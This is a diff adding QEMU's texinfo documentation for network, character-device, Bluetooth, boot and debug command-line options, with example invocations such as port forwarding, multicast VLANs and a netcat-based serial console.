+@item -acpitable [sig=@var{str}][,rev=@var{n}][,oem_id=@var{str}][,oem_table_id=@var{str}][,oem_rev=@var{n}] [,asl_compiler_id=@var{str}][,asl_compiler_rev=@var{n}][,data=@var{file1}[:@var{file2}]...]
+@findex -acpitable
+Add ACPI table with specified header fields and context from specified files.
+@item -smbios file=@var{binary}
+@findex -smbios
+Load SMBIOS entry from binary file.
+
+@item -smbios type=0[,vendor=@var{str}][,version=@var{str}][,date=@var{str}][,release=@var{%d.%d}]
+@findex -smbios
+Specify SMBIOS type 0 fields
+
+@item -smbios type=1[,manufacturer=@var{str}][,product=@var{str}] [,version=@var{str}][,serial=@var{str}][,uuid=@var{uuid}][,sku=@var{str}] [,family=@var{str}]
+Specify SMBIOS type 1 fields
+
+@end table
+Network options:
+@table @option
+@item -net nic[,vlan=@var{n}][,macaddr=@var{mac}][,model=@var{type}] [,name=@var{name}][,addr=@var{addr}][,vectors=@var{v}]
+@findex -net
+Create a new Network Interface Card and connect it to VLAN @var{n} (@var{n}
+= 0 is the default). The NIC is an e1000 by default on the PC
+target. Optionally, the MAC address can be changed to @var{mac}, the
+device address set to @var{addr} (PCI cards only),
+and a @var{name} can be assigned for use in monitor commands.
+Optionally, for PCI cards, you can specify the number @var{v} of MSI-X vectors
+that the card should have; this option currently only affects virtio cards; set
+@var{v} = 0 to disable MSI-X. If no @option{-net} option is specified, a single
+NIC is created.  Qemu can emulate several different models of network card.
+Valid values for @var{type} are
+@code{virtio}, @code{i82551}, @code{i82557b}, @code{i82559er},
+@code{ne2k_pci}, @code{ne2k_isa}, @code{pcnet}, @code{rtl8139},
+@code{e1000}, @code{smc91c111}, @code{lance} and @code{mcf_fec}.
+Not all devices are supported on all targets.  Use -net nic,model=?
+for a list of available devices for your target.
+
+@item -net user[,@var{option}][,@var{option}][,...]
+Use the user mode network stack which requires no administrator
+privilege to run. Valid options are:
+
+@table @option
+@item vlan=@var{n}
+Connect user mode stack to VLAN @var{n} (@var{n} = 0 is the default).
+
+@item name=@var{name}
+Assign symbolic name for use in monitor commands.
+
+@item net=@var{addr}[/@var{mask}]
+Set IP network address the guest will see. Optionally specify the netmask,
+either in the form a.b.c.d or as number of valid top-most bits. Default is
+10.0.2.0/8.
+
+@item host=@var{addr}
+Specify the guest-visible address of the host. Default is the 2nd IP in the
+guest network, i.e. x.x.x.2.
+
+@item restrict=y|yes|n|no
+If this options is enabled, the guest will be isolated, i.e. it will not be
+able to contact the host and no guest IP packets will be routed over the host
+to the outside. This option does not affect explicitly set forwarding rule.
+
+@item hostname=@var{name}
+Specifies the client hostname reported by the builtin DHCP server.
+
+@item dhcpstart=@var{addr}
+Specify the first of the 16 IPs the built-in DHCP server can assign. Default
+is the 16th to 31st IP in the guest network, i.e. x.x.x.16 to x.x.x.31.
+
+@item dns=@var{addr}
+Specify the guest-visible address of the virtual nameserver. The address must
+be different from the host address. Default is the 3rd IP in the guest network,
+i.e. x.x.x.3.
+
+@item tftp=@var{dir}
+When using the user mode network stack, activate a built-in TFTP
+server. The files in @var{dir} will be exposed as the root of a TFTP server.
+The TFTP client on the guest must be configured in binary mode (use the command
+@code{bin} of the Unix TFTP client).
+
+@item bootfile=@var{file}
+When using the user mode network stack, broadcast @var{file} as the BOOTP
+filename. In conjunction with @option{tftp}, this can be used to network boot
+a guest from a local directory.
+
+Example (using pxelinux):
+@example
+qemu -hda linux.img -boot n -net user,tftp=/path/to/tftp/files,bootfile=/pxelinux.0
+@end example
+
+@item smb=@var{dir}[,smbserver=@var{addr}]
+When using the user mode network stack, activate a built-in SMB
+server so that Windows OSes can access to the host files in @file{@var{dir}}
+transparently. The IP address of the SMB server can be set to @var{addr}. By
+default the 4th IP in the guest network is used, i.e. x.x.x.4.
+
+In the guest Windows OS, the line:
+@example
+10.0.2.4 smbserver
+@end example
+must be added in the file @file{C:\WINDOWS\LMHOSTS} (for windows 9x/Me)
+or @file{C:\WINNT\SYSTEM32\DRIVERS\ETC\LMHOSTS} (Windows NT/2000).
+
+Then @file{@var{dir}} can be accessed in @file{\smbserver\qemu}.
+
+Note that a SAMBA server must be installed on the host OS in
+@file{/usr/sbin/smbd}. QEMU was tested successfully with smbd versions from
+Red Hat 9, Fedora Core 3 and OpenSUSE 11.x.
+
+@item hostfwd=[tcp|udp]:[@var{hostaddr}]:@var{hostport}-[@var{guestaddr}]:@var{guestport}
+Redirect incoming TCP or UDP connections to the host port @var{hostport} to
+the guest IP address @var{guestaddr} on guest port @var{guestport}. If
+@var{guestaddr} is not specified, its value is x.x.x.15 (default first address
+given by the built-in DHCP server). By specifying @var{hostaddr}, the rule can
+be bound to a specific host interface. If no connection type is set, TCP is
+used. This option can be given multiple times.
+
+For example, to redirect host X11 connection from screen 1 to guest
+screen 0, use the following:
+
+@example
+# on the host
+qemu -net user,hostfwd=tcp:127.0.0.1:6001-:6000 [...]
+# this host xterm should open in the guest X11 server
+xterm -display :1
+@end example
+
+To redirect telnet connections from host port 5555 to telnet port on
+the guest, use the following:
+
+@example
+# on the host
+qemu -net user,hostfwd=tcp::5555-:23 [...]
+telnet localhost 5555
+@end example
+
+Then when you use on the host @code{telnet localhost 5555}, you
+connect to the guest telnet server.
+
+@item guestfwd=[tcp]:@var{server}:@var{port}-@var{dev}
+Forward guest TCP connections to the IP address @var{server} on port @var{port}
+to the character device @var{dev}. This option can be given multiple times.
+
+@end table
+
+Note: Legacy stand-alone options -tftp, -bootp, -smb and -redir are still
+processed and applied to -net user. Mixing them with the new configuration
+syntax gives undefined results. Their use for new applications is discouraged
+as they will be removed from future versions.
+
+@item -net tap[,vlan=@var{n}][,name=@var{name}][,fd=@var{h}][,ifname=@var{name}] [,script=@var{file}][,downscript=@var{dfile}]
+Connect the host TAP network interface @var{name} to VLAN @var{n}, use
+the network script @var{file} to configure it and the network script
+@var{dfile} to deconfigure it. If @var{name} is not provided, the OS
+automatically provides one. @option{fd}=@var{h} can be used to specify
+the handle of an already opened host TAP interface. The default network
+configure script is @file{/etc/qemu-ifup} and the default network
+deconfigure script is @file{/etc/qemu-ifdown}. Use @option{script=no}
+or @option{downscript=no} to disable script execution. Example:
+
+@example
+qemu linux.img -net nic -net tap
+@end example
+
+More complicated example (two NICs, each one connected to a TAP device)
+@example
+qemu linux.img -net nic,vlan=0 -net tap,vlan=0,ifname=tap0 \
+-net nic,vlan=1 -net tap,vlan=1,ifname=tap1
+@end example
+
+@item -net socket[,vlan=@var{n}][,name=@var{name}][,fd=@var{h}] [,listen=[@var{host}]:@var{port}][,connect=@var{host}:@var{port}]
+
+Connect the VLAN @var{n} to a remote VLAN in another QEMU virtual
+machine using a TCP socket connection. If @option{listen} is
+specified, QEMU waits for incoming connections on @var{port}
+(@var{host} is optional). @option{connect} is used to connect to
+another QEMU instance using the @option{listen} option. @option{fd}=@var{h}
+specifies an already opened TCP socket.
+
+Example:
+@example
+# launch a first QEMU instance
+qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+-net socket,listen=:1234
+# connect the VLAN 0 of this instance to the VLAN 0
+# of the first instance
+qemu linux.img -net nic,macaddr=52:54:00:12:34:57 \
+-net socket,connect=127.0.0.1:1234
+@end example
+
+@item -net socket[,vlan=@var{n}][,name=@var{name}][,fd=@var{h}][,mcast=@var{maddr}:@var{port}[,localaddr=@var{addr}]]
+
+Create a VLAN @var{n} shared with another QEMU virtual
+machines using a UDP multicast socket, effectively making a bus for
+every QEMU with same multicast address @var{maddr} and @var{port}.
+NOTES:
+@enumerate
+@item
+Several QEMU can be running on different hosts and share same bus (assuming
+correct multicast setup for these hosts).
+@item
+mcast support is compatible with User Mode Linux (argument @option{eth@var{N}=mcast}), see
+@url{http://user-mode-linux.sf.net}.
+@item
+Use @option{fd=h} to specify an already opened UDP multicast socket.
+@end enumerate
+
+Example:
+@example
+# launch one QEMU instance
+qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+-net socket,mcast=230.0.0.1:1234
+# launch another QEMU instance on same "bus"
+qemu linux.img -net nic,macaddr=52:54:00:12:34:57 \
+-net socket,mcast=230.0.0.1:1234
+# launch yet another QEMU instance on same "bus"
+qemu linux.img -net nic,macaddr=52:54:00:12:34:58 \
+-net socket,mcast=230.0.0.1:1234
+@end example
+
+Example (User Mode Linux compat.):
+@example
+# launch QEMU instance (note mcast address selected
+# is UML's default)
+qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+-net socket,mcast=239.192.168.1:1102
+# launch UML
+/path/to/linux ubd0=/path/to/root_fs eth0=mcast
+@end example
+
+Example (send packets from host's 1.2.3.4):
+@example
+qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+-net socket,mcast=239.192.168.1:1102,localaddr=1.2.3.4
+@end example
+
+@item -net vde[,vlan=@var{n}][,name=@var{name}][,sock=@var{socketpath}] [,port=@var{n}][,group=@var{groupname}][,mode=@var{octalmode}]
+Connect VLAN @var{n} to PORT @var{n} of a vde switch running on host and
+listening for incoming connections on @var{socketpath}. Use GROUP @var{groupname}
+and MODE @var{octalmode} to change default ownership and permissions for
+communication port. This option is available only if QEMU has been compiled
+with vde support enabled.
+
+Example:
+@example
+# launch vde switch
+vde_switch -F -sock /tmp/myswitch
+# launch QEMU instance
+qemu linux.img -net nic -net vde,sock=/tmp/myswitch
+@end example
+
+@item -net dump[,vlan=@var{n}][,file=@var{file}][,len=@var{len}]
+Dump network traffic on VLAN @var{n} to file @var{file} (@file{qemu-vlan0.pcap} by default).
+At most @var{len} bytes (64k by default) per packet are stored. The file format is
+libpcap, so it can be analyzed with tools such as tcpdump or Wireshark.
+
+@item -net none
+Indicate that no network devices should be configured. It is used to
+override the default configuration (@option{-net nic -net user}) which
+is activated if no @option{-net} options are provided.
+
+@end table
+
+Character device options:
+
+The general form of a character device option is:
+@table @option
+
+@item -chardev @var{backend} ,id=@var{id} [,mux=on|off] [,@var{options}]
+@findex -chardev
+Backend is one of:
+@option{null},
+@option{socket},
+@option{udp},
+@option{msmouse},
+@option{vc},
+@option{file},
+@option{pipe},
+@option{console},
+@option{serial},
+@option{pty},
+@option{stdio},
+@option{braille},
+@option{tty},
+@option{parport},
+@option{spicevmc}.
+The specific backend will determine the applicable options.
+
+All devices must have an id, which can be any string up to 127 characters long.
+It is used to uniquely identify this device in other command line directives.
+
+A character device may be used in multiplexing mode by multiple front-ends.
+The key sequence of @key{Control-a} and @key{c} will rotate the input focus
+between attached front-ends. Specify @option{mux=on} to enable this mode.
+
+Options to each backend are described below.
+
+@item -chardev null ,id=@var{id}
+A void device. This device will not emit any data, and will drop any data it
+receives. The null backend does not take any options.
+
+@item -chardev socket ,id=@var{id} [@var{TCP options} or @var{unix options}] [,server] [,nowait] [,telnet]
+
+Create a two-way stream socket, which can be either a TCP or a unix socket. A
+unix socket will be created if @option{path} is specified. Behaviour is
+undefined if TCP options are specified for a unix socket.
+
+@option{server} specifies that the socket shall be a listening socket.
+
+@option{nowait} specifies that QEMU should not block waiting for a client to
+connect to a listening socket.
+
+@option{telnet} specifies that traffic on the socket should interpret telnet
+escape sequences.
+
+TCP and unix socket options are given below:
+
+@table @option
+
+@item TCP options: port=@var{port} [,host=@var{host}] [,to=@var{to}] [,ipv4] [,ipv6] [,nodelay]
+
+@option{host} for a listening socket specifies the local address to be bound.
+For a connecting socket species the remote host to connect to. @option{host} is
+optional for listening sockets. If not specified it defaults to @code{0.0.0.0}.
+
+@option{port} for a listening socket specifies the local port to be bound. For a
+connecting socket specifies the port on the remote host to connect to.
+@option{port} can be given as either a port number or a service name.
+@option{port} is required.
+
+@option{to} is only relevant to listening sockets. If it is specified, and
+@option{port} cannot be bound, QEMU will attempt to bind to subsequent ports up
+to and including @option{to} until it succeeds. @option{to} must be specified
+as a port number.
+
+@option{ipv4} and @option{ipv6} specify that either IPv4 or IPv6 must be used.
+If neither is specified the socket may use either protocol.
+
+@option{nodelay} disables the Nagle algorithm.
+
+@item unix options: path=@var{path}
+
+@option{path} specifies the local path of the unix socket. @option{path} is
+required.
+
+@end table
+
+@item -chardev udp ,id=@var{id} [,host=@var{host}] ,port=@var{port} [,localaddr=@var{localaddr}] [,localport=@var{localport}] [,ipv4] [,ipv6]
+
+Sends all traffic from the guest to a remote host over UDP.
+
+@option{host} specifies the remote host to connect to. If not specified it
+defaults to @code{localhost}.
+
+@option{port} specifies the port on the remote host to connect to. @option{port}
+is required.
+
+@option{localaddr} specifies the local address to bind to. If not specified it
+defaults to @code{0.0.0.0}.
+
+@option{localport} specifies the local port to bind to. If not specified any
+available local port will be used.
+
+@option{ipv4} and @option{ipv6} specify that either IPv4 or IPv6 must be used.
+If neither is specified the device may use either protocol.
+
+@item -chardev msmouse ,id=@var{id}
+
+Forward QEMU's emulated msmouse events to the guest. @option{msmouse} does not
+take any options.
+
+@item -chardev vc ,id=@var{id} [[,width=@var{width}] [,height=@var{height}]] [[,cols=@var{cols}] [,rows=@var{rows}]]
+
+Connect to a QEMU text console. @option{vc} may optionally be given a specific
+size.
+
+@option{width} and @option{height} specify the width and height respectively of
+the console, in pixels.
+
+@option{cols} and @option{rows} specify that the console be sized to fit a text
+console with the given dimensions.
+
+@item -chardev file ,id=@var{id} ,path=@var{path}
+
+Log all traffic received from the guest to a file.
+
+@option{path} specifies the path of the file to be opened. This file will be
+created if it does not already exist, and overwritten if it does. @option{path}
+is required.
+
+@item -chardev pipe ,id=@var{id} ,path=@var{path}
+
+Create a two-way connection to the guest. The behaviour differs slightly between
+Windows hosts and other hosts:
+
+On Windows, a single duplex pipe will be created at
+@file{\.pipe\@option{path}}.
+
+On other hosts, 2 pipes will be created called @file{@option{path}.in} and
+@file{@option{path}.out}. Data written to @file{@option{path}.in} will be
+received by the guest. Data written by the guest can be read from
+@file{@option{path}.out}. QEMU will not create these fifos, and requires them to
+be present.
+
+@option{path} forms part of the pipe path as described above. @option{path} is
+required.
+
+@item -chardev console ,id=@var{id}
+
+Send traffic from the guest to QEMU's standard output. @option{console} does not
+take any options.
+
+@option{console} is only available on Windows hosts.
+
+@item -chardev serial ,id=@var{id} ,path=@option{path}
+
+Send traffic from the guest to a serial device on the host.
+
+@option{serial} is
+only available on Windows hosts.
+
+@option{path} specifies the name of the serial device to open.
+
+@item -chardev pty ,id=@var{id}
+
+Create a new pseudo-terminal on the host and connect to it. @option{pty} does
+not take any options.
+
+@option{pty} is not available on Windows hosts.
+
+@item -chardev stdio ,id=@var{id} [,signal=on|off]
+Connect to standard input and standard output of the qemu process.
+
+@option{signal} controls if signals are enabled on the terminal, that includes
+exiting QEMU with the key sequence @key{Control-c}. This option is enabled by
+default, use @option{signal=off} to disable it.
+
+@option{stdio} is not available on Windows hosts.
+
+@item -chardev braille ,id=@var{id}
+
+Connect to a local BrlAPI server. @option{braille} does not take any options.
+
+@item -chardev tty ,id=@var{id} ,path=@var{path}
+
+Connect to a local tty device.
+
+@option{tty} is only available on Linux, Sun, FreeBSD, NetBSD, OpenBSD and
+DragonFlyBSD hosts.
+
+@option{path} specifies the path to the tty. @option{path} is required.
+
+@item -chardev parport ,id=@var{id} ,path=@var{path}
+
+@option{parport} is only available on Linux, FreeBSD and DragonFlyBSD hosts.
+
+Connect to a local parallel port.
+
+@option{path} specifies the path to the parallel port device. @option{path} is
+required.
+
+#if defined(CONFIG_SPICE)
+@item -chardev spicevmc ,id=@var{id} ,debug=@var{debug}, name=@var{name}
+
+@option{debug} debug level for spicevmc
+
+@option{name} name of spice channel to connect to
+
+Connect to a spice virtual machine channel, such as vdiport.
+#endif
+
+@end table
+
+Bluetooth(R) options:
+@table @option
+
+@item -bt hci[...]
+@findex -bt
+Defines the function of the corresponding Bluetooth HCI.  -bt options
+are matched with the HCIs present in the chosen machine type.  For
+example when emulating a machine with only one HCI built into it, only
+the first @code{-bt hci[...]} option is valid and defines the HCI's
+logic.  The Transport Layer is decided by the machine type.  Currently
+the machines @code{n800} and @code{n810} have one HCI and all other
+machines have none.
+
+@anchor{bt-hcis}
+The following three types are recognized:
+
+@table @option
+@item -bt hci,null
+(default) The corresponding Bluetooth HCI assumes no internal logic
+and will not respond to any HCI commands or emit events.
+
+@item -bt hci,host[:@var{id}]
+(@code{bluez} only) The corresponding HCI passes commands / events
+to / from the physical HCI identified by the name @var{id} (default:
+@code{hci0}) on the computer running QEMU.  Only available on @code{bluez}
+capable systems like Linux.
+
+@item -bt hci[,vlan=@var{n}]
+Add a virtual, standard HCI that will participate in the Bluetooth
+scatternet @var{n} (default @code{0}).  Similarly to @option{-net}
+VLANs, devices inside a bluetooth network @var{n} can only communicate
+with other devices in the same network (scatternet).
+@end table
+
+@item -bt vhci[,vlan=@var{n}]
+(Linux-host only) Create a HCI in scatternet @var{n} (default 0) attached
+to the host bluetooth stack instead of to the emulated target.  This
+allows the host and target machines to participate in a common scatternet
+and communicate.  Requires the Linux @code{vhci} driver installed.  Can
+be used as following:
+
+@example
+qemu [...OPTIONS...] -bt hci,vlan=5 -bt vhci,vlan=5
+@end example
+
+@item -bt device:@var{dev}[,vlan=@var{n}]
+Emulate a bluetooth device @var{dev} and place it in network @var{n}
+(default @code{0}).  QEMU can only emulate one type of bluetooth devices
+currently:
+
+@table @option
+@item keyboard
+Virtual wireless keyboard implementing the HIDP bluetooth profile.
+@end table
+@end table
+
+Linux/Multiboot boot specific:
+
+When using these options, you can use a given Linux or Multiboot
+kernel without installing it in the disk image. It can be useful
+for easier testing of various kernels.
+
+@table @option
+@item -kernel @var{bzImage}
+@findex -kernel
+Use @var{bzImage} as kernel image. The kernel can be either a Linux kernel
+or in multiboot format.
+@item -append @var{cmdline}
+@findex -append
+Use @var{cmdline} as kernel command line
+@item -initrd @var{file}
+@findex -initrd
+Use @var{file} as initial ram disk.
+
+@item -initrd "@var{file1} arg=foo,@var{file2}"
+
+This syntax is only available with multiboot.
+
+Use @var{file1} and @var{file2} as modules and pass arg=foo as parameter to the
+first module.
+@end table
+
+Debug/Expert options:
+@table @option
+@item -serial @var{dev}
+@findex -serial
+Redirect the virtual serial port to host character device
+@var{dev}. The default device is @code{vc} in graphical mode and
+@code{stdio} in non graphical mode.
+
+This option can be used several times to simulate up to 4 serial
+ports.
+
+Use @code{-serial none} to disable all serial ports.
+
+Available character devices are:
+@table @option
+@item vc[:@var{W}x@var{H}]
+Virtual console. Optionally, a width and height can be given in pixel with
+@example
+vc:800x600
+@end example
+It is also possible to specify width or height in characters:
+@example
+vc:80Cx24C
+@end example
+@item pty
+[Linux only] Pseudo TTY (a new PTY is automatically allocated)
+@item none
+No device is allocated.
+@item null
+void device
+@item /dev/XXX
+[Linux only] Use host tty, e.g. @file{/dev/ttyS0}. The host serial port
+parameters are set according to the emulated ones.
+@item /dev/parport@var{N}
+[Linux only, parallel port only] Use host parallel port
+@var{N}. Currently SPP and EPP parallel port features can be used.
+@item file:@var{filename}
+Write output to @var{filename}. No character can be read.
+@item stdio
+[Unix only] standard input/output
+@item pipe:@var{filename}
+name pipe @var{filename}
+@item COM@var{n}
+[Windows only] Use host serial port @var{n}
+@item udp:[@var{remote_host}]:@var{remote_port}[@@[@var{src_ip}]:@var{src_port}]
+This implements UDP Net Console.
+When @var{remote_host} or @var{src_ip} are not specified
+they default to @code{0.0.0.0}.
+When not using a specified @var{src_port} a random port is automatically chosen.
+
+If you just want a simple readonly console you can use @code{netcat} or
+@code{nc}, by starting qemu with: @code{-serial udp::4555} and nc as:
+@code{nc -u -l -p 4555}. Any time qemu writes something to that port it
+will appear in the netconsole session.
+
+If you plan to send characters back via netconsole or you want to stop
+and start qemu a lot of times, you should have qemu use the same
+source port each time by using something like @code{-serial
+udp::4555@@:4556} to qemu. Another approach is to use a patched
+version of netcat which can listen to a TCP port and send and receive
+characters via udp.  If you have a patched version of netcat which
+activates telnet remote echo and single char transfer, then you can
+use the following options to step up a netcat redirector to allow
+telnet on port 5555 to access the qemu port.
+@table @code
+@item Qemu Options:
+-serial udp::4555@@:4556
+@item netcat options:
+-u -P 4555 -L 0.0.0.0:4556 -t -p 5555 -I -T
+@item telnet options:
+localhost 5555
+@end table
+
+@item tcp:[@var{host}]:@var{port}[,@var{server}][,nowait][,nodelay]
+The TCP Net Console has two modes of operation.  It can send the serial
+I/O to a location or wait for a connection from a location.  By default
+the TCP Net Console is sent to @var{host} at the @var{port}.  If you use
+the @var{server} option QEMU will wait for a client socket application
+to connect to the port before continuing, unless the @code{nowait}
+option was specified.  The @code{nodelay} option disables the Nagle buffering
+algorithm.  If @var{host} is omitted, 0.0.0.0 is assumed. Only
+one TCP connection at a time is accepted. You can use @code{telnet} to
+connect to the corresponding character device.
+@table @code
+@item Example to send tcp console to 192.168.0.2 port 4444
+-serial tcp:192.168.0.2:4444
+@item Example to listen and wait on port 4444 for connection
+-serial tcp::4444,server
+@item Example to not wait and listen on ip 192.168.0.100 port 4444
+-serial tcp:192.168.0.100:4444,server,nowait
+@end table
+
+@item telnet:@var{host}:@var{port}[,server][,nowait][,nodelay]
+The telnet protocol is used instead of raw tcp sockets.  The options
+work the same as if you had specified @code{-serial tcp}.  The
+difference is that the port acts like a telnet server or client using
+telnet option negotiation.  This will also allow you to send the
+MAGIC_SYSRQ sequence if you use a telnet that supports sending the break
+sequence.  Typically in unix telnet you do it with Control-] and then
+type "send break" followed by pressing the enter key.
+
+@item unix:@var{path}[,server][,nowait]
+A unix domain socket is used instead of a tcp socket.  The option works the
+same as if you had specified @code{-serial tcp} except the unix domain socket
+@var{path} is used for connections.
+
+@item mon:@var{dev_string}
+This is a special option to allow the monitor to be multiplexed onto
+another serial port.  The monitor is accessed with key sequence of
+@key{Control-a} and then pressing @key{c}. See monitor access
+@ref{pcsys_keys} in the -nographic section for more keys.
+@var{dev_string} should be any one of the serial devices specified
+above.  An example to multiplex the monitor onto a telnet server
+listening on port 4444 would be:
+@table @code
+@item -serial mon:telnet::4444,server,nowait
+@end table
+
+@item braille
+Braille device.  This will use BrlAPI to display the braille output on a real
+or fake device.
+
+@item msmouse
+Three button serial mouse. Configure the guest to use Microsoft protocol.
+@end table
+@item -parallel @var{dev}
+@findex -parallel
+Redirect the virtual parallel port to host device @var{dev} (same
+devices as the serial port). On Linux hosts, @file{/dev/parportN} can
+be used to use hardware devices connected on the corresponding host
+parallel port.
+
+This option can be used several times to simulate up to 3 parallel
+ports.
+
+Use @code{-parallel none} to disable all parallel ports.
+@item -monitor @var{dev}
+@findex -monitor
+Redirect the monitor to host device @var{dev} (same devices as the
+serial port).
+The default device is @code{vc} in graphical mode and @code{stdio} in
+non graphical mode.
+@item -qmp @var{dev}
+@findex -qmp
+Like -monitor but opens in 'control' mode.
+@item -mon chardev=[name][,mode=readline|control][,default]
+@findex -mon
+Setup monitor on chardev @var{name}.
+@item -debugcon @var{dev}
+@findex -debugcon
+Redirect the debug console to host device @var{dev} (same devices as the
+serial port).  The debug console is an I/O port which is typically port
+0xe9; writing to that I/O port sends output to this device.
+The default device is @code{vc} in graphical mode and @code{stdio} in
+non graphical mode.
+@item -pidfile @var{file}
+@findex -pidfile
+Store the QEMU process PID in @var{file}. It is useful if you launch QEMU
+from a script.
+@item -singlestep
+@findex -singlestep
+Run the emulation in single step mode.
+@item -S
+@findex -S
+Do not start CPU at startup (you must type 'c' in the monitor).
+@item -gdb @var{dev}
+@findex -gdb
+Wait for gdb connection on device @var{dev} (@pxref{gdb_usage}). Typical
+connections will likely be TCP-based, but also UDP, pseudo TTY, or even
+stdio are reasonable use case. The latter is allowing to start qemu from
+within gdb and establish the connection via a pipe:
+@example
+(gdb) target remote | exec qemu -gdb stdio ...
+@end example
+@item -s
+@findex -s
+Shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234
+(@pxref{gdb_usage}).
+@item -d
+@findex -d
+Output log in /tmp/qemu.log
+@item -hdachs @var{c},@var{h},@var{s},[,@var{t}]
+@findex -hdachs
+Force hard disk 0 physical geometry (1 <= @var{c} <= 16383, 1 <=
+@var{h} <= 16, 1 <= @var{s} <= 63) and optionally force the BIOS
+translation mode (@var{t}=none, lba or auto). Usually QEMU can guess
+all those parameters. This option is useful for old MS-DOS disk
+images.
+@item -L  @var{path}
+@findex -L
+Set the directory for the BIOS, VGA BIOS and keymaps.
+@item -bios @var{file}
+@findex -bios
+Set the filename for the BIOS.
+@item -enable-kvm
+@findex -enable-kvm
+Enable KVM full virtualization support. This option is only available
+if KVM support is enabled when compiling.
+@item -xen-domid @var{id}
+@findex -xen-domid
+Specify xen guest domain @var{id} (XEN only).
+@item -xen-create
+@findex -xen-create
+Create domain using xen hypercalls, bypassing xend.
+Warning: should not be used when xend is in use (XEN only).
+@item -xen-attach
+@findex -xen-attach
+Attach to existing xen domain.
+xend will use this when starting qemu (XEN only).
+@item -no-reboot
+@findex -no-reboot
+Exit instead of rebooting.
+@item -no-shutdown
+@findex -no-shutdown
+Don't exit QEMU on guest shutdown, but instead only stop the emulation.
+This allows for instance switching to monitor to commit changes to the
+disk image.
+@item -loadvm @var{file}
+@findex -loadvm
+Start right away with a saved state (@code{loadvm} in monitor)
+@item -daemonize
+@findex -daemonize
+Daemonize the QEMU process after initialization.  QEMU will not detach from
+standard IO until it is ready to receive connections on any of its devices.
+This option is a useful way for external programs to launch QEMU without having
+to cope with initialization race conditions.
+@item -option-rom @var{file}
+@findex -option-rom
+Load the contents of @var{file} as an option ROM.
+This option is useful to load things like EtherBoot.
+@item -clock @var{method}
+@findex -clock
+Force the use of the given methods for timer alarm. To see what timers
+are available use -clock ?.
+
+@item -rtc [base=utc|localtime|@var{date}][,clock=host|vm][,driftfix=none|slew]
+@findex -rtc
+Specify @option{base} as @code{utc} or @code{localtime} to let the RTC start at the current
+UTC or local time, respectively. @code{localtime} is required for correct date in
+MS-DOS or Windows. To start at a specific point in time, provide @var{date} in the
+format @code{2006-06-17T16:01:21} or @code{2006-06-17}. The default base is UTC.
+
+By default the RTC is driven by the host system time. This allows to use the
+RTC as accurate reference clock inside the guest, specifically if the host
+time is smoothly following an accurate external reference clock, e.g. via NTP.
+If you want to isolate the guest time from the host, even prevent it from
+progressing during suspension, you can set @option{clock} to @code{vm} instead.
+
+Enable @option{driftfix} (i386 targets only) if you experience time drift problems,
+specifically with Windows' ACPI HAL. This option will try to figure out how
+many timer interrupts were not processed by the Windows guest and will
+re-inject them.
+@item -icount [@var{N}|auto]
+@findex -icount
+Enable virtual instruction counter.  The virtual cpu will execute one
+instruction every 2^@var{N} ns of virtual time.  If @code{auto} is specified
+then the virtual cpu speed will be automatically adjusted to keep virtual
+time within a few seconds of real time.
+
+Note that while this option can give deterministic behavior, it does not
+provide cycle accurate emulation.  Modern CPUs contain superscalar out of
+order cores with complex cache hierarchies.  The number of instructions
+executed often has little or no correlation with actual performance.
+@item -watchdog @var{model}
+@findex -watchdog
+Create a virtual hardware watchdog device.  Once enabled (by a guest
+action), the watchdog must be periodically polled by an agent inside
+the guest or else the guest will be restarted.
+
+The @var{model} is the model of hardware watchdog to emulate.  Choices
+for model are: @code{ib700} (iBASE 700) which is a very simple ISA
+watchdog with a single timer, or @code{i6300esb} (Intel 6300ESB I/O
+controller hub) which is a much more featureful PCI-based dual-timer
+watchdog.  Choose a model for which your guest has drivers.
+
+Use @code{-watchdog ?} to list available hardware models.  Only one
+watchdog can be enabled for a guest.
+@item -watchdog-action @var{action}
+
+The @var{action} controls what QEMU will do when the watchdog timer
+expires.
+The default is
+@code{reset} (forcefully reset the guest).
+Other possible actions are:
+@code{shutdown} (attempt to gracefully shutdown the guest),
+@code{poweroff} (forcefully poweroff the guest),
+@code{pause} (pause the guest),
+@code{debug} (print a debug message and continue), or
+@code{none} (do nothing).
+
+Note that the @code{shutdown} action requires that the guest responds
+to ACPI signals, which it may not be able to do in the sort of
+situations where the watchdog would have expired, and thus
+@code{-watchdog-action shutdown} is not recommended for production use.
+
+Examples:
+
+@table @code
+@item -watchdog i6300esb -watchdog-action pause
+@item -watchdog ib700
+@end table
+
+@item -echr @var{numeric_ascii_value}
+@findex -echr
+Change the escape character used for switching to the monitor when using
+monitor and serial sharing.  The default is @code{0x01} when using the
+@code{-nographic} option.  @code{0x01} is equal to pressing
+@code{Control-a}.  You can select a different character from the ascii
+control keys where 1 through 26 map to Control-a through Control-z.  For
+instance you could use the either of the following to change the escape
+character to Control-t.
+@table @code
+@item -echr 0x14
+@item -echr 20
+@end table
+@item -virtioconsole @var{c}
+@findex -virtioconsole
+Set virtio console.
+
+This option is maintained for backward compatibility.
+
+Please use @code{-device virtconsole} for the new way of invocation.
+@item -show-cursor
+@findex -show-cursor
+Show cursor.
+@item -tb-size @var{n}
+@findex -tb-size
+Set TB size.
+@item -incoming @var{port}
+@findex -incoming
+Prepare for incoming migration, listen on @var{port}.
+@item -nodefaults
+@findex -nodefaults
+Don't create default devices.
+@item -chroot @var{dir}
+@findex -chroot
+Immediately before starting guest execution, chroot to the specified
+directory.  Especially useful in combination with -runas.
+@item -runas @var{user}
+@findex -runas
+Immediately before starting guest execution, drop root privileges, switching
+to the specified user.
+@item -prom-env @var{variable}=@var{value}
+@findex -prom-env
+Set OpenBIOS nvram @var{variable} to given @var{value} (PPC, SPARC only).
+@item -semihosting
+@findex -semihosting
+Semihosting mode (ARM, M68K only).
+@item -old-param
+@findex -old-param (ARM)
+Old param mode (ARM only).
+@item -readconfig @var{file}
+@findex -readconfig
+Read device configuration from @var{file}.
+@item -writeconfig @var{file}
+@findex -writeconfig
+Write device configuration to @var{file}.
+@item -nodefconfig
+@findex -nodefconfig
+Normally QEMU loads a configuration file from @var{sysconfdir}/qemu.conf and
+@var{sysconfdir}/target-@var{ARCH}.conf on startup.  The @code{-nodefconfig}
+option will prevent QEMU from loading these configuration files at startup.
+@item -trace
+@findex -trace
+Specify a trace file to log output traces to.
+@end table
